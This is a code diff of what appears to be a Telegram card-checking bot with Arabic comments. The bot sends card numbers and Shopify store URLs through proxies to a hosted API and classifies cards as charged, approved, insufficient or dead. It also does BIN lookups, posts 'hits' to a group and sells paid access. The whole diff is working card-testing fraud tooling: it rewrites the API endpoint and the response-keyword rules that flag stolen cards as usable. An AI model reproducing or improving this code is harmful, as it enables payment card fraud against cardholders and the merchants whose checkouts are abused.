@@ -84,8 +84,8 @@ JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
 JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
-# الرابط المحلي الخاص بك بالصيغة الهندسية الصحيحة الشاملة للمسار /sh
-SHOPIFY_API_URL_1 = 'http://192.168.0.3:5000/sh'
+# رابط الـ API الثابت والمباشر على منصة Railway بدون تقطيع
+SHOPIFY_API_URL_1 = 'https://web-production-7c318.up.railway.app/sh'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
@@ -350,7 +350,6 @@ def is_paid_plan(plan):
     return plan and plan.lower() in [p.lower() for p in PAID_TIERS]
 
 _USER_HTTP_SESSIONS = {}
-# [تم الإصلاح الجوهري هنا] إزالة القيود الصارمة ومهلات الـ Timeout الافتراضية للجلسة لكي تعمل إعدادات التايم آوت المخصصة بحرية وبدون تعارض كود داخلي
 async def get_user_http_session(uid):
     key = f"{uid}_msp"
     if key not in _USER_HTTP_SESSIONS or _USER_HTTP_SESSIONS[key].closed:
@@ -415,8 +414,8 @@ def is_dead_site_error(err):
     e = str(err).lower()
     bad_keywords = [
         'step 0', 'step 0 failed', 'step 1', 'step 1 failed', 'missing stable', 'missing stablei',
-        'max ret', 'cloudflare', 'timed out', 'bad gateway', 'service unavailable', 
-        'gateway timeout', 'site dead', 'session_error', 'max retries', 'max retries exceeded',
+        'cloudflare', 'bad gateway', 'service unavailable', 
+        'gateway timeout', 'site dead', 'session_error',
         '504', '502', '503', '429', 'tunnel', 'connection close', 'format error'
     ]
     return any(k in e for k in bad_keywords)
@@ -550,11 +549,10 @@ async def get_bin_info(bin_code, session=None):
 
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
 
-# [تحديث الحماية والتوافقية الكاملة] تنظيف البروكسيات وبناء المعاملات بما يتوافق 100% مع الـ API لرفع الكفاءة
+# ======================== [تعديل دالة معالجة وفحص الاستجابة بدقة متناهية من السكربت الأول] ========================
 async def check_shopify_api(api_url, card, site, proxy, session):
     try:
         proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
-        
         if proxy_str and "://" in proxy_str:
             proxy_str = proxy_str.split("://")[-1]
         
@@ -565,56 +563,64 @@ async def check_shopify_api(api_url, card, site, proxy, session):
         site_encoded = quote(site_param)
         
         proxy_param = f"&proxy={quote(proxy_str)}" if proxy_str else "&proxy="
-        
         req_url = f"{api_url}?cc={card_encoded}&site={site_encoded}{proxy_param}"
         
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
         }
         
-        # [تعديل مهلة السيرفر المحلي] رفع المهلة إلى 25 ثانية كاملة لتعمل الجلسة الآن بحرية مطلقة بدون قيود
-        async with session.get(req_url, headers=headers, timeout=25) as resp:
+        async with session.get(req_url, headers=headers, timeout=12) as resp:
             if resp.status == 429:
                 return {'status': 'Rate Limit', 'message': 'API Rate Limited (429)', 'card': card, 'retry': True}
             if resp.status in [502, 503, 504]:
                 return {'status': 'Site Error', 'message': f'Server Overloaded ({resp.status})', 'card': card, 'retry': True}
-            if resp.status != 200: 
-                return {'status': 'Site Error', 'message': f'API HTTP Status {resp.status}', 'card': card, 'retry': True}
                 
             text_data = await resp.text()
-            try: 
-                rj = json.loads(text_data)
-            except Exception: 
-                tl = text_data.lower()
-                if "charged" in tl or "success" in tl:
-                    return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': 'Shopify', 'price': '$10.00'}
-                if "insufficient" in tl:
-                    return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': 'Shopify', 'price': '$10.00'}
-                return {'status': 'Site Error', 'message': 'Invalid API JSON Response', 'card': card, 'retry': True}
+
+        # تطبيق منطق معالجة السكربت الأول حرفياً لمنع الرفض الخاطئ
+        try:
+            data = json.loads(text_data)
+        except Exception:
+            data = {"Response": text_data, "Status": True, "Price": 0}
             
-        if not rj.get('status', True) and 'error' in rj:
-            return {'status': 'Site Error', 'message': rj.get('error', 'API Blocked'), 'card': card, 'retry': True}
-            
-        rm = str(rj.get('result', rj.get('Response', rj.get('message', rj.get('error', rj.get('msg', rj.get('status', ''))))))).strip()
-        pr = rj.get('Price', rj.get('amount', "$10.00")) 
-        gt = rj.get('Gateway', 'Shopify')
-        rl = rm.lower()
+        response_msg = str(data.get("Response", "No Response"))
+        response_text = response_msg.lower()
+        price = data.get("Price", data.get("amount", "0"))
+        gt = data.get('Gateway', 'Shopify')
         
-        if is_dead_site_error(rm) or any(k in rl for k in ['proxy', 'timeout', 'error', 'session', 'bad gateway', 'max ret', 'step 0', 'missing']):
-            return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
-        if 'insufficient' in rl or 'funds' in rl or 'balance' in rl:
-            return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': gt, 'price': pr}
-        if 'charged' in rl or 'completed' in rl or 'payment succeeded' in rl or 'success' in rl: 
-            return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': gt, 'price': pr}
-        if '3d' in rl or 'secure' in rl or 'otp' in rl:
-            return {'status': 'Approved', 'message': '3d_secure_required', 'card': card, 'gateway': gt, 'price': pr}
-        if 'approved' in rl or any(k in rl for k in ['invalid_cvv', 'match']): 
-            return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
-        return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
+        # الكلمات المفتاحية للشحن: Charge 🔥
+        charge_keywords = ['charged', 'order_placed', 'thank you', 'payment successful']
+        if any(kw in response_text for kw in charge_keywords):
+            return {'status': 'Charged', 'message': response_msg, 'card': card, 'gateway': gt, 'price': price, 'retry': False}
+
+        # الكلمات المفتاحية للموافقة والقبول: Approved ✅
+        approved_keywords = [
+            'approved', 'success', 'insufficient_funds', 'insufficient funds', 
+            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 
+            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc', 
+            'incorrect_zip', 'incorrect zip', 'cvv issue', '3d', '3d secure', 
+            'otp', 'verification required', 'authenticate', 'authentication required', 
+            'challenge required', 'redirecting to bank', 'bank verification', 
+            'send code', 'enter code', 'verify'
+        ]
+        if any(kw in response_text for kw in approved_keywords):
+            if any(k in response_text for k in ['insufficient', 'funds', 'balance']):
+                return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': gt, 'price': price, 'retry': False}
+            return {'status': 'Approved', 'message': response_msg, 'card': card, 'gateway': gt, 'price': price, 'retry': False}
+
+        # التحقق إذا كانت استجابة تالفة من البروكسي تتطلب إعادة محاولة حقيقية فقط وليس رفض الكارت
+        if is_dead_site_error(response_msg) or any(k in response_text for k in ['timeout', 'max retries', 'cloudflare', 'bad gateway', 'tunnel']):
+            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gt, 'price': price}
+
+        # أي رد آخر غير مطابق يعتبر رفض نهائي للكارت دون إدخاله في حلقة تكرار خاطئة
+        return {'status': 'Dead', 'message': response_msg, 'card': card, 'gateway': gt, 'price': price, 'retry': False}
+        
     except asyncio.TimeoutError:
-        return {'status': 'Site Error', 'message': 'Local Server Timeout', 'card': card, 'retry': True}
+        return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
     except Exception as e: 
-        return {'status': 'Site Error', 'message': f'Connection Drop: {str(e)[:18]}', 'card': card, 'retry': True}
+        return {'status': 'Site Error', 'message': f'API Error: {str(e)[:15]}', 'card': card, 'retry': False}
+
+# ==============================================================================
 
 async def remove_proxy_by_url(uid, proxy_url):
     try:
@@ -626,7 +632,6 @@ async def remove_proxy_by_url(uid, proxy_url):
                     break
     except Exception: pass
 
-# [تم التحديث الجوهري] تصفية وحذف تلقائي للبروكسيات الميتة منعاً لتجميد خيوط الفحص وثبات معدل CPM
 async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid, max_retries=3):
     lr = None
     for attempt in range(max_retries):
@@ -1020,7 +1025,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 un = escape_html(_USER_NAMES.get(u, f"User {u}"))
                 gate = p.get("gate", "Unknown")
                 total = p.get("total", "?")
-                active_info.append(f"  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id='>{un}</a> (<code>{sf(str(u))}</code>)\n  │  ╰ Gate: <code>{sf(gate)}</code> | CCs: <code>{sf(str(total))}</code>")
+                active_info.append(f"  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a> (<code>{sf(str(u))}</code>)\n  │  ╰ Gate: <code>{sf(gate)}</code> | CCs: <code>{sf(str(total))}</code>")
                 
         recent_users_info = []
         sorted_users = sorted(USER_LAST_REQ.items(), key=lambda x: x[1], reverse=True)[:15] 
@@ -1029,11 +1034,16 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             recent_users_info.append(f"  │  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a>\n  │  ╰ ID: <code>{sf(str(u))}</code>")
             
         text = f"<b>{CE_GEAR} {sf('Global System Status')}</b>\n\n├ <b>{sf('Total Session Users')}:</b> <code>{sf(str(len(USER_LAST_REQ)))}</code>\n"
-        if recent_users_info: text += f"  │  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a>\n  │  ╰ ID: <code>{sf(str(u))}</code>\n"
-        else: text += f"  ╰ {sf('Recent Users')}: <code>{sf('None')}</code>\n\n"
+        if recent_users_info: 
+            text += "\n".join(recent_users_info) + "\n"
+        else: 
+            text += f"  ╰ {sf('Recent Users')}: <code>{sf('None')}</code>\n\n"
+            
         text += f"├ <b>{sf('Active Checkers')}:</b> <code>{sf(str(len(active_info)))}</code>\n"
-        if active_info: text += f"╰ <b>{sf('Currently Checking')}:</b>\n" + "\n".join(active_info)
-        else: text += f"╰ <b>{sf('Currently Checking')}:</b> <code>{sf('None')}</code>"
+        if active_info: 
+            text += f"╰ <b>{sf('Currently Checking')}:</b>\n" + "\n".join(active_info)
+        else: 
+            text += f"╰ <b>{sf('Currently Checking')}:</b> <code>{sf('None')}</code>"
         await styled_reply(update, text, use_gif=True)
 
     elif cmd == "revoke":
@@ -1052,7 +1062,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try: await styled_send(context.bot, tu, f"<b>{CE_BOOM} {sf('System Alert')}</b>\n\n╰ {sf('Your VIP access has been revoked by the administrator.')}", use_gif=True)
         except Exception: pass
 
-    # [أمر حصري للآدمن] جلب بوابات جيت هاب وفحصها فحصاً حقيقياً عبر البروكسيات وحذف التالف فوراً
+    # أمر جلب بوابات جيت هاب وفحصها فحصاً حقيقياً عبر البروكسيات وحذف التالف فوراً
     elif cmd == "checkgates":
         if uid not in ADMIN_ID: return
         tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Fetching gates from GitHub...')}</b>", use_gif=True)
